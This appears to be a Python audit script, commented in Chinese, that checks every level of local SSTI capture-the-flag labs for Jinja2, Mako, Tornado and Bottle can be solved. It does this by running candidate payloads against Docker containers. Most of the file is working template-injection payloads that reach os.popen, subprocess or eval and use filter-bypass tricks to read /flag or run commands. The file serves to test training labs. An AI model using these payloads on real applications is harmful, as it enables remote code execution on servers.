#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""可解性审计：把每个关卡的**候选解**真的打一遍，给出「可解 / 未找到解」的矩阵。

为什么要单独做这件事：
``scripts/verify_labs.py`` 只验证「我挑出来的那几条 payload 能不能用」，
它**不能回答**「每一关都有解吗」。而一个无解的关卡就是坏靶场，
所以这里对每一关都跑一批候选载荷（含已知的通用绕过通道），
明确区分三种状态：

  SOLVED   —— 拿到了 flag（或等价的可证明执行/求值证据）
  PARTIAL  —— 绕过成功、拿到了代码执行/属性遍历，但没能取出 flag
  UNKNOWN  —— 该关的候选全部被 WAF 拦下或报错

用法::

    python tests/audit_solvability.py                # 全部链式靶场
    python tests/audit_solvability.py 02 03          # 只审计指定靶场
    python tests/audit_solvability.py --keep         # 保留容器
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

FLAG = {
    "02": "flag{audit_02}",
    "03": "flag{audit_03}",
    "04": "flag{audit_04}",
    "09": "flag{audit_09}",
}

# ---------------------------------------------------------------------------
# 候选载荷库
#
# 每个 lab 是 {level_id: [(说明, template, query_dict), ...]}。
# 顺序无关紧要：只要**任意一条**拿到 flag 即记 SOLVED，
# 拿到执行证据但没拿到 flag 记 PARTIAL。
# ---------------------------------------------------------------------------
Q_FLAG = {"c": "cat /flag"}
Q_ID = {"c": "id"}

JINJA: dict[str, list[tuple[str, str, dict[str, str]]]] = {
    # ---- L1 无过滤
    "0": [("通用链", "{{lipsum.__globals__.os.popen('cat /flag').read()}}", {})],
    # ---- L2 拦截 {{
    "1": [("语句块 print", "{% print(lipsum.__globals__.os.popen('cat /flag').read()) %}", {})],
    # ---- L3 盲渲染：练习模式只回 correct/wrong，但 god 模式的 raw_output 是真实输出，
    #      所以「直接渲染 flag」本身就能证明可解（之前的探针只把 flag 用在 if 条件里，
    #      导致假阴性）
    "2": [
        ("直接渲染 flag（god 模式的 raw_output 可见）",
         "{{lipsum.__globals__.os.popen('cat /flag').read()}}", {}),
    ],
    # ---- L4 禁方括号
    "3": [("通用链本就不需要方括号", "{{lipsum.__globals__.os.popen('cat /flag').read()}}", {})],
    # ---- L5 禁引号 ⇒ request.args 带入
    "4": [
        ("request.args 传命令", "{{lipsum.__globals__.os.popen(request.args.c).read()}}", Q_FLAG),
        ("%c 造斜杠/字母", "{{lipsum.__globals__.os.popen('%c%c%c %c%c%c%c%c'|format(99,97,116,47,102,108,97,103)).read()}}", {}),
    ],
    # ---- L6 禁下划线（字符）
    "5": [
        ("属性名全从请求带入", "{{lipsum[request.args.a][request.args.b][request.args.c](request.args.d)[request.args.e]()}}",
         {"a": "__globals__", "b": "os", "c": "popen", "d": "cat /flag", "e": "read"}),
        ("%c 造下划线 + 下标",
         "{{lipsum['%c%cglobals%c%c'|format(95,95,95,95)]['o'~'s']['pop'~'en']('cat /flag')['re'~'ad']()}}", {}),
    ],
    # ---- L7 禁点号 ⇒ 下标
    "6": [
        ("下标链", "{{lipsum['__globals__']['os']['popen']('cat /flag')['read']()}}", {}),
        ("dict.get 取模块", "{{lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('cat /flag')|attr('read')()}}", {}),
    ],
    # ---- L8 关键字子串（含 attr/global/open/request…）
    "7": [
        ("拼接关键字 + 下标",
         "{{lipsum['__glo'~'bals__']['o'~'s']['po'~'pen']('ca'~'t'~' /flag')['re'~'ad']()}}", {}),
        ("dict 关键字 + dict.get",
         "{{lipsum['__glo'~'bals__']|attr('ge'~'t')('o'~'s')|attr('pop'~'en')('ca'~'t /flag')|attr('re'~'ad')()}}", {}),
    ],
    # ---- L9 禁数字：request 未被拦 ⇒ 命令从请求带入，模板里一个数字都没有
    "8": [
        ("request.args 传命令（无数字）", "{{lipsum.__globals__.os.popen(request.args.c).read()}}", Q_FLAG),
        ("dict 造关键字 + get", "{{lipsum|attr(dict(__globals__=1)|first)|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)(request.args.c)|attr(dict(read=1)|first)()}}", Q_FLAG),
    ],
    # ---- L10 前缀置空 config/self
    "9": [("换用 lipsum 入口", "{{lipsum.__globals__.os.popen('cat /flag').read()}}", {})],
    # ---- L11 组合过滤：' " + . [ ] 与 request 全禁
    #
    # 突破口：**关键字参数**不需要引号。
    #   dict(__globals__=1)|first        → 字符串 '__globals__'
    #   dict(get=1)|first                → 'get'（dict 的真属性，getattr 拿得到）
    #   dict(__builtins__=1)|first       → 字符串 '__builtins__'
    #   dict(chr=1)|first                → 'chr'
    # 有了 chr 就能在运行期拼出任意字符串（含空格/斜杠），再用 ~ 连接。
    # 这套思路同时绕过了「无引号」和「无点号/方括号」。
    "10": [
        ("dict(kw)|first 造字符串 + chr 拼命令（取 flag）",
         "{%set u=lipsum|attr(dict(__globals__=1)|first)%}"
         "{%set g=u|attr(dict(get=1)|first)%}"
         "{%set b=g(dict(__builtins__=1)|first)|attr(dict(get=1)|first)%}"
         "{%set c=b(dict(chr=1)|first)%}"
         "{%set o=g(dict(os=1)|first)%}"
         "{{o|attr(dict(popen=1)|first)(c(99)~c(97)~c(116)~c(60)~c(47)~c(102)~c(108)~c(97)~c(103))"
         "|attr(dict(read=1)|first)()}}",
         {}),
        ("同思路先证明代码执行",
         "{%set u=lipsum|attr(dict(__globals__=1)|first)%}"
         "{%set g=u|attr(dict(get=1)|first)%}"
         "{{g(dict(os=1)|first)|attr(dict(popen=1)|first)(dict(id=1)|first)|attr(dict(read=1)|first)()}}",
         {}),
    ],
    # ---- L12 强字符集：再加 _ 与数字。dict(__globals__=1) 含下划线 ⇒ 不可用，
    #      chr(95) 也需要数字 —— 但是！本关**没有禁 request 也没有禁数字以外的任何东西
    #      之外**——等等，数字确实被禁；可 request 没被禁：属性名全部从 query 带入，
    #      payload 里一个 `_`、一个引号、一个数字都不出现。
    "11": [
        ("request.args 带入全部属性名（无引号/下划线/数字）",
         "{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}"
         "{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))"
         "(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))"
         "|attr(r(dict(f=true)|first))()}}",
         {"a": "__globals__", "b": "get", "c": "os", "d": "popen",
          "e": "cat /flag", "f": "read"}),
        ("同思路先证明代码执行（只带 __globals__/os）",
         "{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}"
         "{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))}}",
         {"a": "__globals__", "b": "get", "c": "os"}),
    ],
    # ---- L13 扩展关键字：在 L12 基础上再禁 request/class/init/arg/config/app/self。
    #      `attr` 在表内 ⇒ `|attr` / getattr / map(attribute=…) 全部写不出来，
    #      加上点号与方括号被禁，Jinja 的**全部属性访问原语**不可用。
    #      这是刻意保留的作者挑战关 —— 至今没有已证明的解（见 SOLVABILITY.md）。
    "12": [
        ("试 dict(kw)|first（含下划线 ⇒ 被拦）",
         "{{lipsum|attr(dict(__globals__=1)|first)}}", {}),
        ("试 joiner/cycler 一类全局（名字不含被禁子串）",
         "{{cycler|string}}", {}),
        ("试 lipsum 的 repr 取字符",
         "{{lipsum|string}}", {}),
    ],
}

MAKO: dict[str, list[tuple[str, str, dict[str, str]]]] = {
    "0": [("直接 open", "${open('/flag').read()}", {}),
          ("os.popen", "${__import__('os').popen('cat /flag').read()}", {})],
    "1": [("代码块 context.write", "<%\nimport os\ncontext.write(os.popen('cat /flag').read())\n%>", {})],
    "2": [("直接渲染 flag（god 模式的 raw_output 可见）", "${open('/flag').read()}", {})],
    "3": [("open 不需要方括号", "${open('/flag').read()}", {})],
    "4": [("chr 拼路径", "${open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}", {})],
    "5": [("chr 拼路径（无下划线标识符）", "${open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}", {})],
    "6": [("getattr 替代点号", "${getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}", {})],
    "7": [("__import__ + getoutput", "${__import__(chr(115)+'ubprocess').getoutput('cat /flag')}", {}),
          ("subprocess 字面", "${__import__('subprocess').getoutput('cat /flag')}", {})],
    "8": [("open 链本就不需要数字", "${open('/flag').read()}", {})],
    "9": [("前缀不影响 open 链", "${open('/flag').read()}", {})],
    # ---- L11 组合过滤：突破点有两族 —— ① bytes((…)) / chr 造串（Mako 是原生 Python，
    #      内置函数直接可用）；② min(dict(kw=1)) 取键名 + str(bytes((…)),'utf8')，
    #      在无引号、无加号、无点号的条件下造出任意字符串。
    "10": [
        ("bytes((...)) 造路径（无引号/无加号/无点号）",
         "<%!\nimport os\n%>${getattr(open(bytes((47,102,108,97,103))),chr(114)+chr(101)+chr(97)+chr(100))()}", {}),
        ("getattr + chr 名字",
         "${getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}", {}),
        ("__import__ + min(dict(kw)) + str(bytes,'utf8') 造串",
         "${getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))"
         "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}", {}),
    ],
    # ---- L12 强字符集：_ . 0-9 \\ ' " [ ] 全禁。`+` 仍可用、`True` 仍在：
    #      True 算术凑 chr(47)，`dict(flag=True)|first` 白嫖文件名，open 直读。
    "11": [
        ("True 算术凑 chr(47) + dict(flag) 键名（无引号无数字无下划线）",
         "${getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True+True+True"
         "+True+True+True+True)-True)+min(dict(flag=True))),min(dict(read=True)))()}", {}),
    ],
    # ---- L13 扩展关键字：`getattr` 含 attr 被禁、`+` 被禁 —— 但代码块里的
    #      `from x import y` 语句不在黑名单里，数字也仍然可用。
    "12": [
        ("代码块 from-import + str(bytes,'utf8') 造串",
         "<% from subprocess import getoutput %>"
         "${getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}", {}),
    ],
}

TORNADO: dict[str, list[tuple[str, str, dict[str, str]]]] = {
    "0": [("open 直读", "{{open('/flag').read()}}", {}),
          ("import os", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
    # ---- L2 拦截 open（原设计拦 {{ 是设计缺陷 —— Tornado 只有 {{ }} 一种输出构造，
    #      拦掉它等于拿掉回显通道；已按 SOLVABILITY.md 2.1 的建议改为拦关键词）。
    #      open/popen 都写不了，换 subprocess.getoutput 这条不含被禁子串的 gadget。
    "1": [
        ("__import__ + getoutput", "{{__import__('subprocess').getoutput('cat /flag')}}", {}),
        ("{% import subprocess %} 直导", "{% import subprocess %}{{subprocess.getoutput('cat /flag')}}", {}),
    ],
    "2": [("直接渲染 flag（god 模式的 raw_output 可见）", "{{open('/flag').read()}}", {})],
    "3": [("下标替代", "{{open('/flag').read()}}", {})],
    "4": [("chr 拼路径", "{% import os %}{{os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}", {})],
    "5": [("无下划线标识符", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
    "6": [
        ("getattr 替代点号", "{% import os %}{{getattr(getattr(os,'popen')('cat /flag'),'read')()}}", {}),
    ],
    # ---- L8 关键字子串（含 attr / global / open …）
    #
    # 关键认识：Tornado 模板直接拿得到 **Python 内置函数**，
    # 所以根本不需要 escape.__globals__ 那一套（那条路上 getattr 含 attr、
    # popen 含 open、__globals__ 含 global，全都会踩雷）。
    # `__import__('subprocess').getoutput(...)` 三个关键字一个都不含。
    "7": [
        ("__import__ + getoutput（不碰 global/attr/open）",
         "{{__import__('subprocess').getoutput('cat /flag')}}", {}),
        ("__import__ + check_output（列表传参）",
         "{{__import__('subprocess').check_output(['/bin/cat','/flag'])}}", {}),
    ],
    "8": [("import 无数字", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
    "9": [("前缀不影响 import", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
    # ---- L11 组合过滤：`_` 没被禁、数字可用 ⇒ getattr / min / str / bytes 全部直接可用；
    #      命令串用 str(bytes((…)),'utf8') 造（无引号、无点号、无加号、无方括号）。
    "10": [
        ("import os + getattr 链 + str(bytes,'utf8') 造串",
         "{% import os %}{{getattr(getattr(os,min(dict(popen=1)))"
         "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}", {}),
    ],
    # ---- L12 强字符集：_ . 0-9 \ ' " [ ] 全禁，但 `+` 没被禁、`True` 仍在：
    #      os.sep 是 '/'，dict(flag=True) 的键名是 'flag'，open 直读。
    "11": [
        ("os.sep + dict(flag) 键名 + open 直读",
         "{% import os %}{{getattr(open(getattr(os,min(dict(sep=True)))+min(dict(flag=True))),"
         "min(dict(read=True)))()}}", {}),
    ],
    # ---- L13 扩展关键字：getattr 含 attr 被禁、`_` 与 `.` 被禁 —— 但 `{% from x import y %}`
    #      语句不在黑名单里（实测 Tornado 支持），str(bytes((…)),'utf8') 造串不需要被禁字符，
    #      数字也仍然可用。eval(str(bytes)) 是不依赖 from-import 的兜底。
    "12": [
        ("{% from subprocess import getoutput %} + str(bytes) 造串",
         "{% from subprocess import getoutput %}"
         "{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}", {}),
        ("eval(str(bytes)) 兜底（无 from-import 依赖）",
         "{{eval(str(bytes((" + ",".join(str(ord(c)) for c in "__import__('os').popen('cat /flag').read()") + ")),min(dict(utf8=1))))}}", {}),
    ],
}

BOTTLE: dict[str, list[tuple[str, str, dict[str, str]]]] = {
    "0": [("open 直读", "{{open('/flag').read()}}", {}),
          ("getoutput", "{{__import__('subprocess').getoutput('cat /flag')}}", {})],
    # ---- L2 拦截 {{：代码块里的模板输出原语 _stdout / _printlist 就是回显通道
    #      （注意 SimpleTemplate 要求 %>\n 后必须换行）
    "1": [
        ("_printlist 写输出", "<% _printlist((str(7*7),),) %>\n", {}),
        ("_stdout + open 读 flag", "<% _stdout.append(open('/flag').read()) %>\n", {}),
    ],
    "2": [("直接渲染 flag（god 模式的 raw_output 可见）", "{{open('/flag').read()}}", {})],
    "3": [("open 直读（本就不需要下标）", "{{open('/flag').read()}}", {})],
    "4": [("chr 拼路径", "{{open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}", {})],
    "5": [("chr 拼路径（无下划线标识符）", "{{open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}", {})],
    "6": [("getattr 替代点号",
           "{{getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}}", {})],
    # ---- L8 关键字子串（含 attr / open …）：__import__ / subprocess / getoutput 三个名字都干净
    "7": [
        ("__import__ + getoutput", "{{__import__('subprocess').getoutput('cat /flag')}}", {}),
    ],
    # ---- L9 禁数字：request 没被禁，命令从 query 带入。
    #      注意 Bottle 的 {{ }} 里是原生 Python：MultiDict 要用 .get('c')，
    #      Jinja 那种 request.args.c 属性回退写法在这里不成立。
    "8": [
        ("request.args.get 带命令",
         "{{getattr(getattr(__import__('os'),'popen')(request.args.get('c')),'read')()}}", Q_FLAG),
    ],
    # ---- L10 前缀置空 config：open / __import__ 不受影响
    "9": [("open 直读", "{{open('/flag').read()}}", {})],
    # ---- L11 组合过滤：min(dict(kw)) 取键名 + str(bytes,'utf8') 造串（无引号/加号/点号）
    "10": [
        ("__import__ + min(dict(kw)) + str(bytes,'utf8')",
         "{{getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))"
         "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}", {}),
    ],
    # ---- L12 强字符集：True 算术凑 chr(47) + dict(flag=True) 键名（+ 未被禁）
    "11": [
        ("True 算术 + dict(flag) 键名 + open",
         "{{getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True+True+True"
         "+True+True+True+True)-True)+min(dict(flag=True))),min(dict(read=True)))()}}", {}),
    ],
    # ---- L13 扩展关键字：代码块 from-import + str(bytes) 造串（数字仍可用）。
    #      ⚠️ SimpleTemplate 要求 `%>` 后必须换行，载荷写成两行。
    "12": [
        ("代码块 from-import + str(bytes,'utf8')",
         "<% from subprocess import getoutput %>\n"
         "{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}", {}),
    ],
}

LABS = {
    "02": {"name": "02-jinja-chain", "image": "ssti-jinja-chain:local", "cases": JINJA},
    "03": {"name": "03-mako-chain", "image": "ssti-mako-chain:local", "cases": MAKO},
    "04": {"name": "04-tornado-chain", "image": "ssti-tornado-chain:local", "cases": TORNADO},
    "09": {"name": "09-bottle-chain", "image": "ssti-bottle-chain:local", "cases": BOTTLE},
}


def sh(cmd: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8", errors="replace")


def post(port: int, level: str, template: str, query: dict[str, str]) -> dict:
    url = f"http://127.0.0.1:{port}/api/render"
    if query:
        from urllib.parse import urlencode

        url += "?" + urlencode(query)
    req = urllib.request.Request(
        url,
        data=json.dumps({"level": level, "template": template, "mode": "god"}).encode(),
        headers={"Content-Type": "application/json", "Accept": "*/*"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))


def audit(lab_key: str, port: int, keep: bool) -> dict[str, str]:
    spec = LABS[lab_key]
    flag = FLAG[lab_key]
    container = f"ssti-audit-{lab_key}"
    sh(["docker", "rm", "-f", container])
    r = sh(["docker", "run", "-d", "--name", container, "-p", f"{port}:5000",
            "-e", f"STATIC_FLAG={flag}", spec["image"]])
    if r.returncode != 0:
        print(f"  启动失败：{r.stderr.strip()[:200]}")
        return {}

    verdicts: dict[str, str] = {}
    try:
        for _ in range(40):
            try:
                with urllib.request.urlopen(f"http://127.0.0.1:{port}/healthz", timeout=3) as resp:
                    if resp.status == 200:
                        break
            except Exception:  # noqa: BLE001
                time.sleep(1)
        info = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{port}/api/lab-info", timeout=8).read())
        levels = {lv["id"]: lv for lv in info["levels"]}
        print(f"\n=== {spec['name']}（{len(levels)} 关）flag={flag} ===")

        for level_id in sorted(levels, key=int):
            title = levels[level_id]["title"]
            cases = spec["cases"].get(level_id, [])
            verdict = "UNKNOWN"
            evidence = ""
            for note, tpl, query in cases:
                try:
                    j = post(port, level_id, tpl, query)
                except Exception as exc:  # noqa: BLE001
                    evidence = f"{note}: {type(exc).__name__}"
                    continue
                # 盲关：真实输出只在 god 模式的 raw_output
                blob = " ".join(str(j.get(k) or "") for k in ("output", "raw_output"))
                if flag in blob:
                    verdict, evidence = "SOLVED", f"{note} → flag"
                    break
                if "uid=" in blob:
                    verdict = "PARTIAL"
                    evidence = f"{note} → 有代码执行(uid=) 但没取到 flag"
                elif verdict == "UNKNOWN":
                    out = str(j.get("output") or "")[:60]
                    err = str(j.get("error") or "")[:70]
                    evidence = f"{note} → out={out!r} err={err!r}"
            mark = {"SOLVED": "✅ 可解", "PARTIAL": "🟡 部分", "UNKNOWN": "❌ 未找到解"}[verdict]
            print(f"  id={level_id:>2} {title:<26} {mark}   {evidence[:110]}")
            verdicts[level_id] = verdict
    finally:
        if keep:
            print(f"  (--keep) 容器保留：{container}")
        else:
            sh(["docker", "rm", "-f", container])
    return verdicts


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="关卡可解性审计")
    parser.add_argument("labs", nargs="*", help="靶场编号，如 02 03 04")
    parser.add_argument("--keep", action="store_true")
    parser.add_argument("--port-base", type=int, default=19400)
    args = parser.parse_args(argv)

    keys = args.labs or list(LABS)
    summary: dict[str, dict[str, str]] = {}
    for i, key in enumerate(keys):
        if key not in LABS:
            print(f"未知靶场 {key}")
            continue
        summary[key] = audit(key, args.port_base + i, args.keep)

    print("\n" + "=" * 78)
    print("汇总")
    print("=" * 78)
    total = solved = partial = unknown = 0
    for key, v in summary.items():
        s = sum(1 for x in v.values() if x == "SOLVED")
        p = sum(1 for x in v.values() if x == "PARTIAL")
        u = sum(1 for x in v.values() if x == "UNKNOWN")
        total += len(v); solved += s; partial += p; unknown += u
        bad = [k for k, x in v.items() if x != "SOLVED"]
        print(f"  {LABS[key]['name']:<22} 可解 {s}/{len(v)}   部分 {p}   未找到解 {u}"
              + (f"   未解关卡 id={','.join(sorted(bad, key=int))}" if bad else ""))
    print(f"\n  合计：{solved}/{total} 关已证明可解；{partial} 关仅证明执行；{unknown} 关未找到解")
    return 0 if unknown == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
